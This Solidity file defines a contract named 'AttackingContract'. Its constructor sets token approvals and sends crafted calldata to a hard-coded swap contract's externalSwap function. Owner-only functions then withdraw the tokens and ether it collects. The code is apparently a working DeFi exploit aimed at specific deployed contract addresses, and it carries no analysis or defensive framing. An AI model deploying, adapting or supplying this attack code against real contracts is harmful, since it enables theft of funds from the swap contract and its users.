// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface Swap {
    function externalSwap(
        address fromToken,
        address toToken,
        address approveTarget,
        address swapTarget,
        uint256 fromTokenAmount,
        uint256 minReturnAmount,
        bytes memory feeData,
        bytes memory callDataConcat,
        uint256 deadLine
    ) external payable;
}

interface Token {
    function approve(address spender, uint256 amount) external;
}

contract AttackingContract {
    address private owner;

    address private swapContractAddress = 0x39E3e49C99834C9573c9FC7Ff5A4B226cD7B0E63;
    address private tokenContractAddress = 0x3A1fEd3707a69BDc3282B10E23f5B326fa3BC538;

    constructor() public payable{
        owner = msg.sender;
        swapattack();
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the contract owner can call this function");
        _;
    }

    function swapattack() public payable {
        Token token = Token(tokenContractAddress);
        token.approve(swapContractAddress, 10000000000000000000000000000000000);
        token.approve(address(this), 10000000000000000000000000000000000);

        Swap swap = Swap(swapContractAddress);

        // Datos de ejemplo
        bytes memory feeData = hex"0000000000000000000000001271caba4bf23f8fb31f97448605d65ee302ca5100000000000000000000000000000000000000000000000000038d7ea4c68000";
        bytes memory callDataConcat = hex"0502b1c50000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002386f26fc10000000000000000000000000000000000000000000000000000000bf8554f17e09d0000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000100000000000000003b6d034044cf9b70ba64765f7ff0741a16e0fc89333a14a3049e1bc4";

        uint256 deadline = block.timestamp + 1 hours;

        swap.externalSwap{value: 0.01 ether}(
            0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE,
            0x3A1fEd3707a69BDc3282B10E23f5B326fa3BC538,
            0x1111111254EEB25477B68fb85Ed929f73A960582,
            0x1111111254EEB25477B68fb85Ed929f73A960582,
            10000000000000000,
            3365900724987253,
            feeData,
            callDataConcat,
            deadline
        );
    }

    function withdrawTokens(IERC20[] memory tokens, uint256[] memory amounts) external onlyOwner {
        require(tokens.length == amounts.length, "Token and amount arrays must have the same length");

        for (uint256 i = 0; i < tokens.length; i++) {
            uint256 balance = tokens[i].balanceOf(address(this));
            require(balance >= amounts[i], "Insufficient token balance");

            tokens[i].transfer(msg.sender, amounts[i]);
        }
    }

    function withdrawEther(uint256 amount) external onlyOwner {
        require(address(this).balance >= amount, "Insufficient Ether balance");
        payable(msg.sender).transfer(amount);
    }
}
